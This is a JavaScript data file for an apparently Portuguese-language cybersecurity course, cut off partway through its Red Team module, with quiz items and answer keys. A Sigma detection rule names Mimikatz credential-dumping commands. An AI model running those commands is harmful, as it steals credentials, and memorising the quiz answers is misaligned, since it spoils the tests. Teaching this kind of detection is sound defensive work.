
var SVGI = {
  /* Geral */
  shield:
    '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
  lock: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
  unlock:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>',
  check:
    '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
  checkCircle:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>',
  alertTri:
    '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
  eye: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>',
  search:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>',
  code: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>',
  terminal:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
  server:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>',
  database:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>',
  wifi: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>',
  globe:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
  key: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>',
  cpu: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>',
  zap: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
  target:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>',
  users:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>',
  mail: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>',
  phone:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.18h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>',
  hash: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>',
  layers:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>',
  activity:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>',
  bug: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M8 2l1.88 1.88"/><path d="M14.12 3.88L16 2"/><path d="M9 7.13v-1a3.003 3.003 0 1 1 6 0v1"/><path d="M12 20c-3.3 0-6-2.7-6-6v-3a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v3c0 3.3-2.7 6-6 6z"/><path d="M12 20v-9"/><path d="M6.53 9C4.6 8.8 3 7.1 3 5"/><path d="M6 13H2"/><path d="M3 21c0-2.1 1.7-3.9 4-4"/><path d="M17.47 9c1.93-.2 3.53-1.9 3.53-4"/><path d="M18 13h4"/><path d="M21 21c0-2.1-1.7-3.9-4-4"/></svg>',
  cloud:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"/></svg>',
  moon: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>',
  hexagon:
    '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5 12 2"/></svg>',
  arrowLeft:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>',
  arrowRight:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>',
  flag: '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg>',
  scroll:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>',
  /* Sidebar icons */
  bookOpen:
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>',
  /* Card accent icons */
  conf: '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
  integ:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
  avail:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
  sword:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="14.5 17.5 3 6 3 3 6 3 17.5 14.5"/><line x1="13" y1="19" x2="19" y2="13"/><line x1="16" y1="16" x2="20" y2="20"/><line x1="19" y1="21" x2="21" y2="19"/></svg>',
  radar:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20.2 7.8l-7.7 7.7-4-4-5.7 5.7"/><path d="M22 2L20.2 7.8"/><path d="M15.8 4L22 2"/></svg>',
};

var STUDY_MODULES = [
  /* ─────────────────────────────────────────────────────────
     MÓDULO 0 — INTRODUÇÃO
  ───────────────────────────────────────────────────────── */
  {
    id: "intro",
    title: "Introdução à Cybersegurança",
    subtitle: "O campo de batalha invisível",
    locked: false,
    unlockAfter: null,
    svgIcon: SVGI.shield,
    estimatedMin: 12,
    sections: [
      {
        type: "text",
        title: "O que é Cybersegurança?",
        content: `Cybersegurança é a prática de proteger sistemas, redes, programas e dados contra ataques digitais, danos ou acessos não autorizados. Não é uma tecnologia — é uma disciplina. Uma postura. Uma maneira de pensar sobre qualquer sistema conectado.

Vivemos em um mundo onde bilhões de dispositivos estão permanentemente conectados. Cada conexão é uma superfície de ataque potencial. Cada software instalado é uma porta que pode ser forçada. Cada usuário é um vetor de entrada que um adversário pode explorar.

A cybersegurança existe para reduzir o risco a um nível aceitável — não para eliminá-lo. Risco zero não existe. O que existe é preparo.`,
      },
      {
        type: "cards",
        title: "Os Três Pilares: CIA Triad",
        cards: [
          {
            svgIcon: SVGI.conf,
            term: "Confidencialidade",
            def: "Apenas pessoas autorizadas têm acesso às informações. Violada por vazamentos, interceptação de dados, credenciais expostas.",
          },
          {
            svgIcon: SVGI.integ,
            term: "Integridade",
            def: "Os dados não foram alterados de forma não autorizada. Violada por SQL Injection, man-in-the-middle, adulteração de logs.",
          },
          {
            svgIcon: SVGI.avail,
            term: "Disponibilidade",
            def: "Sistemas e dados estão acessíveis quando necessário. Violada por ataques DDoS, ransomware, falhas de infraestrutura.",
          },
        ],
      },
      {
        type: "text",
        title: "Por que isso importa agora?",
        content: `Em 2023, o custo médio global de uma violação de dados chegou a US$ 4,45 milhões. Ataques de ransomware paralisaram hospitais, interromperam oleodutos e comprometeram eleições. O adversário não é mais um hacker solitário em um porão — são grupos organizados, estados-nação e redes criminosas com recursos equivalentes a empresas de médio porte.

A superfície de ataque expandiu dramaticamente: cloud computing, IoT, trabalho remoto e cadeia de suprimentos de software criaram pontos de entrada que não existiam há dez anos. Cada novo serviço adotado por uma empresa é um novo vetor que um adversário pode explorar antes que a equipe de segurança sequer saiba que ele existe.`,
      },
      {
        type: "cards",
        title: "Os Perfis do Campo de Batalha",
        cards: [
          {
            svgIcon: SVGI.shield,
            term: "Team Blue",
            def: "Defesa. Monitoramento, detecção de ameaças, resposta a incidentes, hardening de sistemas. Jogam no gol.",
          },
          {
            svgIcon: SVGI.sword,
            term: "Team Red",
            def: "Ataque controlado. Pentest, engenharia social, exploração de vulnerabilidades — com autorização. Pensam como o inimigo.",
          },
          {
            svgIcon: SVGI.activity,
            term: "Team Purple",
            def: "A ponte entre Red e Blue. Colaboração ativa: Red ataca, Blue defende, Purple garante que os dois aprendem um com o outro.",
          },
          {
            svgIcon: SVGI.search,
            term: "OSINT / Recon",
            def: "Inteligência de fontes abertas. Coleta de informações públicas para mapear alvos antes de qualquer ataque ou defesa.",
          },
        ],
      },
      {
        type: "code",
        title: "A Mentalidade: Modelagem de Ameaças",
        language: "text",
        description:
          "Todo profissional de segurança pensa com estas quatro perguntas — independente de ser Red ou Blue:",
        code: `MODELAGEM DE AMEAÇAS — As 4 Perguntas Fundamentais

1. O QUE estou protegendo?
   → Ativos: dados de clientes, código-fonte, infraestrutura, reputação

2. DE QUEM estou protegendo?
   → Adversários: script kiddies, crime organizado, insiders, APTs

3. QUAL a probabilidade e o impacto de cada ameaça?
   → Probabilidade alta + impacto alto = prioridade máxima

4. QUANTO posso investir para mitigar?
   → Custo da proteção nunca deve superar o valor do ativo protegido

Frameworks: STRIDE, PASTA, MITRE ATT&CK`,
      },
      {
        type: "cards",
        title: "Conceitos Fundamentais",
        cards: [
          {
            svgIcon: SVGI.target,
            term: "Vulnerabilidade",
            def: "Fraqueza em um sistema que pode ser explorada. Pode ser técnica (bug no código) ou humana (funcionário sem treinamento).",
          },
          {
            svgIcon: SVGI.zap,
            term: "Exploit",
            def: "Código ou técnica que aproveita uma vulnerabilidade para causar comportamento não intencional no sistema.",
          },
          {
            svgIcon: SVGI.terminal,
            term: "Payload",
            def: 'O "conteúdo" malicioso entregue após a exploração — um shell reverso, ransomware, keylogger.',
          },
          {
            svgIcon: SVGI.bug,
            term: "Zero-Day",
            def: "Vulnerabilidade desconhecida pelo fornecedor do software. Sem patch disponível. Tempo de resposta: zero dias.",
          },
          {
            svgIcon: SVGI.scroll,
            term: "Cadeia de Ataque",
            def: "Sequência de etapas que um adversário segue: reconhecimento → acesso → persistência → exfiltração.",
          },
          {
            svgIcon: SVGI.layers,
            term: "Defesa em Profundidade",
            def: "Múltiplas camadas de controles de segurança. Se uma falha, as outras ainda protegem. Nunca dependa de uma única barreira.",
          },
        ],
      },
      {
        type: "code",
        title: "CVSS — Como Vulnerabilidades são Pontuadas",
        language: "text",
        description:
          "O Common Vulnerability Scoring System (CVSS) é o padrão para quantificar a gravidade de vulnerabilidades:",
        code: `CVSS v3.1 — Sistema de Pontuação de Vulnerabilidades

ESCALA:
  0.0       = Nenhum
  0.1 – 3.9 = Baixo
  4.0 – 6.9 = Médio
  7.0 – 8.9 = Alto
  9.0 – 10  = Crítico

MÉTRICAS BASE:
  Attack Vector (AV):     Network / Adjacent / Local / Physical
  Attack Complexity (AC): Low / High
  Privileges Required:    None / Low / High
  User Interaction:       None / Required
  Scope:                  Unchanged / Changed
  CIA Impact:             None / Low / High (cada pilar)

EXEMPLO REAL — CVE-2021-44228 (Log4Shell):
  AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H
  CVSS Score: 10.0 — CRÍTICO

  → explorável remotamente, sem autenticação, sem interação do usuário
  → Uma das vulnerabilidades mais graves da história do software`,
      },
      {
        type: "cards",
        title: "Tipos de Atacantes (Threat Actors)",
        cards: [
          {
            svgIcon: SVGI.code,
            term: "Script Kiddie",
            def: "Usa ferramentas prontas sem entender o funcionamento. Baixo risco técnico, alto volume — automatizam ataques em escala.",
          },
          {
            svgIcon: SVGI.key,
            term: "Cybercriminoso",
            def: "Motivado por ganho financeiro. Ransomware, fraude, roubo de dados para venda. Crime organizado com estrutura empresarial.",
          },
          {
            svgIcon: SVGI.flag,
            term: "Hacktivista",
            def: "Motivado por ideologia política ou social. Anonymous, grupos que derrubam sites de alvos ideológicos por DDoS.",
          },
          {
            svgIcon: SVGI.globe,
            term: "Estado-Nação (APT)",
            def: "Advanced Persistent Threat. Recursos ilimitados, técnicas sofisticadas, objetivos de espionagem ou sabotagem estratégica.",
          },
          {
            svgIcon: SVGI.users,
            term: "Insider Threat",
            def: "Funcionário atual ou ex-funcionário com acesso legítimo. Pode ser malicioso (roubo) ou acidental (erro humano).",
          },
          {
            svgIcon: SVGI.search,
            term: "Pesquisador",
            def: "Descobre vulnerabilidades com objetivo de reportar (responsible disclosure) ou apresentar em DEF CON / Black Hat.",
          },
        ],
      },
    ],
    lokiQuestions: [
      {
        question: 'O que significa a letra "I" na CIA Triad da cybersegurança?',
        options: ["Identificação", "Integridade", "Intrusão", "Isolamento"],
        correct: 1,
        explanation:
          "Integridade garante que dados não foram alterados de forma não autorizada.",
      },
      {
        question:
          "Qual a diferença entre superfície de ataque e vetor de ataque?",
        options: [
          "São sinônimos — o mesmo conceito com nomes diferentes",
          "Superfície é o conjunto de pontos vulneráveis; vetor é o caminho específico usado para explorar",
          "Superfície refere-se a ataques físicos; vetor a ataques digitais",
          "Vetor é mais amplo que superfície",
        ],
        correct: 1,
        explanation:
          "Superfície = todos os pontos de entrada possíveis. Vetor = o caminho específico que o atacante usa.",
      },
      {
        question:
          "Um ataque ransomware viola qual pilar da CIA Triad principalmente?",
        options: [
          "Confidencialidade",
          "Integridade",
          "Disponibilidade",
          "Os três igualmente",
        ],
        correct: 2,
        explanation:
          "Ransomware bloqueia acesso aos dados — ataque direto à Disponibilidade.",
      },
      {
        question: "O que é um Zero-Day?",
        options: [
          "Um ataque que dura menos de 24 horas",
          "Uma vulnerabilidade sem patch disponível, desconhecida pelo fornecedor",
          "Um exploit que não deixa rastros",
          "Um ataque realizado à meia-noite para evitar detecção",
        ],
        correct: 1,
        explanation:
          "Zero-Day = zero dias para o fornecedor responder. A vulnerabilidade é desconhecida por quem deveria corrigir.",
      },
      {
        question:
          "Uma CVE com score CVSS 9.8 representa qual nível de severidade?",
        options: ["Alto", "Crítico", "Médio", "Baixo"],
        correct: 1,
        explanation:
          "CVSS 9.0–10.0 = Crítico. A Log4Shell recebeu score 10.0 — máximo possível.",
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 1 — TEAM BLUE
  ───────────────────────────────────────────────────────── */
  {
    id: "blue",
    title: "Team Blue",
    subtitle: "A Arte da Defesa",
    locked: true,
    unlockAfter: "intro",
    svgIcon: SVGI.shield,
    estimatedMin: 15,
    sections: [
      {
        type: "text",
        title: "O que é o Team Blue?",
        content: `O Team Blue é a linha de defesa de uma organização. Enquanto o Red Team tenta quebrar as defesas, o Blue Team as constrói, monitora e mantém. São os profissionais que ficam acordados durante um incidente real, rastreando um adversário em tempo real através de logs, alertas e análise forense.

Trabalhar em Blue Team exige uma mentalidade diferente do Red. Você não pode antecipar cada ataque — mas pode construir sistemas que detectam comportamento anômalo, respondem rapidamente e se recuperam com mínimo impacto. É um trabalho de paciência, atenção e análise sistemática.`,
      },
      {
        type: "cards",
        title: "Funções Core do Blue Team",
        cards: [
          {
            svgIcon: SVGI.eye,
            term: "SOC Analyst",
            def: "Security Operations Center. Monitora alertas 24/7, triagem de eventos, escalação de incidentes. Linha de frente da defesa.",
          },
          {
            svgIcon: SVGI.search,
            term: "Threat Hunter",
            def: "Busca proativa por ameaças que já passaram pelos controles automáticos. Assume que o adversário já está dentro.",
          },
          {
            svgIcon: SVGI.activity,
            term: "Incident Responder",
            def: "Gerencia a resposta quando um incidente é confirmado: contenção, erradicação, recuperação e lições aprendidas.",
          },
          {
            svgIcon: SVGI.cpu,
            term: "Security Engineer",
            def: "Constrói e mantém as ferramentas de defesa: SIEM, EDR, firewalls, regras de detecção, automações.",
          },
        ],
      },
      {
        type: "text",
        title: "SIEM — O Cérebro da Defesa",
        content: `SIEM (Security Information and Event Management) é a plataforma central do Blue Team. Coleta logs de toda a infraestrutura — firewalls, servidores, endpoints, aplicações — correlaciona eventos e gera alertas quando padrões suspeitos são detectados.

Um SIEM bem configurado pode detectar movimentação lateral de um adversário horas antes que qualquer dano real ocorra. Um SIEM mal configurado gera milhares de falsos positivos por dia, tornando os analistas insensíveis a alertas reais — um problema conhecido como "alert fatigue".

Ferramentas populares: Splunk, Microsoft Sentinel, Elastic SIEM, IBM QRadar.`,
      },
      {
        type: "code",
        language: "bash",
        title: "Análise de Logs — Exemplo Real",
        description:
          "Identificando tentativa de brute force em logs de autenticação SSH:",
        code: `# Log bruto do /var/log/auth.log
Failed password for root from 192.168.1.105 port 52341 ssh2
Failed password for root from 192.168.1.105 port 52342 ssh2
# ... 847 linhas similares em 3 minutos

# Contar falhas por IP
grep "Failed password" /var/log/auth.log | \\
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Output:
#   847 192.168.1.105   ← ALERTA: brute force detectado
#     3 10.0.0.22

# Bloquear imediatamente
sudo ufw deny from 192.168.1.105 to any

# Fail2ban (automatizado):
# /etc/fail2ban/jail.conf → maxretry = 5, bantime = 3600`,
      },
      {
        type: "cards",
        title: "Framework de Resposta a Incidentes (NIST)",
        cards: [
          {
            svgIcon: SVGI.shield,
            term: "Preparação",
            def: "Políticas, playbooks, ferramentas e treinamento prontos ANTES do incidente. Resposta ruim começa aqui.",
          },
          {
            svgIcon: SVGI.eye,
            term: "Detecção & Análise",
            def: "Identificar que um incidente ocorreu, determinar escopo e impacto. Coleta de evidências forenses.",
          },
          {
            svgIcon: SVGI.lock,
            term: "Contenção",
            def: "Isolar sistemas comprometidos para parar a propagação. Curto prazo (desconectar) e longo prazo (patch).",
          },
          {
            svgIcon: SVGI.bug,
            term: "Erradicação",
            def: "Remover o adversário do ambiente: malware, backdoors, contas comprometidas, vulnerabilidades exploradas.",
          },
          {
            svgIcon: SVGI.zap,
            term: "Recuperação",
            def: "Restaurar sistemas ao estado normal com monitoramento intensificado para detectar reinfecção.",
          },
          {
            svgIcon: SVGI.bookOpen,
            term: "Lições Aprendidas",
            def: "Post-mortem: o que aconteceu, como chegou, o que falhou na detecção, como prevenir na próxima vez.",
          },
        ],
      },
      {
        type: "cards",
        title: "Ferramentas Essenciais do Blue Team",
        cards: [
          {
            svgIcon: SVGI.shield,
            term: "EDR",
            def: "Endpoint Detection & Response. Monitora e responde a ameaças em endpoints. CrowdStrike, SentinelOne, Microsoft Defender.",
          },
          {
            svgIcon: SVGI.server,
            term: "Firewall / NGFW",
            def: "Controla tráfego de rede. Next-Gen Firewalls inspecionam conteúdo dos pacotes, não só IP/porta.",
          },
          {
            svgIcon: SVGI.eye,
            term: "IDS / IPS",
            def: "Intrusion Detection/Prevention System. Detecta (IDS) ou bloqueia (IPS) padrões de ataque conhecidos no tráfego.",
          },
          {
            svgIcon: SVGI.cpu,
            term: "Sandbox",
            def: "Ambiente isolado para executar arquivos suspeitos com segurança e analisar comportamento sem risco ao ambiente real.",
          },
          {
            svgIcon: SVGI.key,
            term: "PAM",
            def: "Privileged Access Management. Controla e audita contas com alto privilégio — alvo principal de qualquer adversário avançado.",
          },
          {
            svgIcon: SVGI.zap,
            term: "SOAR",
            def: "Security Orchestration, Automation & Response. Automatiza respostas a incidentes repetitivos, reduzindo tempo de reação.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "Regra Sigma — Detecção Portável",
        description:
          "Sigma é um formato aberto para escrever regras de detecção que funcionam em qualquer SIEM:",
        code: `# Regra Sigma: Detecção de Mimikatz via linha de comando
title: Mimikatz Command Line Detection
status: stable
description: Detecta uso de Mimikatz para dumping de credenciais
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'sekurlsa::logonpasswords'
            - 'lsadump::sam'
            - 'privilege::debug'
            - 'token::elevate'
    condition: selection
falsepositives:
    - Security testing / Red Team exercises
level: critical

# Converter para Splunk:
# sigma convert -t splunk rule.yml`,
      },
    ],
    lokiQuestions: [
      {
        question: 'O que significa "alert fatigue" no contexto de Blue Team?',
        options: [
          "Cansaço físico de analistas que trabalham turnos noturnos",
          "Insensibilidade a alertas reais causada por volume excessivo de falsos positivos",
          "Falha técnica que desativa alertas do SIEM",
          "Alertas que chegam tarde demais para serem úteis",
        ],
        correct: 1,
        explanation:
          "Alert fatigue: quando há alertas demais, analistas param de levar cada um a sério — e alertas reais são ignorados.",
      },
      {
        question: "Qual etapa do framework NIST acontece APÓS a contenção?",
        options: ["Detecção", "Preparação", "Erradicação", "Lições Aprendidas"],
        correct: 2,
        explanation:
          "Ordem NIST: Preparação → Detecção → Contenção → Erradicação → Recuperação → Lições Aprendidas.",
      },
      {
        question: "Qual a diferença entre IDS e IPS?",
        options: [
          "IDS detecta e bloqueia; IPS apenas detecta",
          "São a mesma tecnologia com nomes diferentes",
          "IDS detecta e alerta; IPS detecta e bloqueia ativamente",
          "IPS é mais antigo que IDS",
        ],
        correct: 2,
        explanation:
          "IDS = Intrusion Detection System (alerta). IPS = Intrusion Prevention System (bloqueia). A diferença é a resposta ativa.",
      },
      {
        question: "O que é EDR em Blue Team?",
        options: [
          "Um tipo de firewall de próxima geração",
          "Monitoramento e resposta a ameaças em endpoints (computadores e servidores)",
          "Um framework de resposta a incidentes",
          "Uma certificação de segurança ofensiva",
        ],
        correct: 1,
        explanation:
          "EDR = Endpoint Detection & Response. Monitora comportamento em endpoints e permite resposta em tempo real.",
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 2 — TEAM RED / PENTEST
  ───────────────────────────────────────────────────────── */
  {
    id: "red",
    title: "Team Red & Pentest",
    subtitle: "Pensar como o adversário",
    locked: true,
    unlockAfter: "blue",
    svgIcon: SVGI.sword,
    estimatedMin: 18,
    sections: [
      {
        type: "text",
        title: "O que é o Team Red?",
        content: `O Team Red simula adversários reais para testar as defesas de uma organização. Não é hacking criminoso — é hacking com autorização explícita, escopo definido e objetivo claro: encontrar vulnerabilidades antes que um adversário real as encontre.

A diferença fundamental entre um pentester e um hacker malicioso não é a técnica — é a autorização e o objetivo. O pentester entrega um relatório detalhado com cada vulnerabilidade encontrada, sua criticidade e como corrigi-la. O adversário real usa as mesmas vulnerabilidades para causar dano.`,
      },
      {
        type: "cards",
        title: "Tipos de Pentest",
        cards: [
          {
            svgIcon: SVGI.lock,
            term: "Black Box",
            def: "Zero conhecimento prévio. O pentester age como um atacante externo sem informações internas. Mais realista.",
          },
          {
            svgIcon: SVGI.unlock,
            term: "White Box",
            def: "Conhecimento total: código-fonte, arquitetura, credenciais. Mais eficiente para cobertura completa.",
          },
          {
            svgIcon: SVGI.eye,
            term: "Gray Box",
            def: "Conhecimento parcial — simula um insider ou atacante com algum acesso. O mais comum em engajamentos reais.",
          },
          {
            svgIcon: SVGI.globe,
            term: "External",
            def: "Foco em ativos expostos à internet: domínios, IPs públicos, aplicações web, APIs.",
          },
          {
            svgIcon: SVGI.server,
            term: "Internal",
            def: "Simula um atacante já dentro da rede — insider malicioso ou adversário que obteve acesso inicial.",
          },
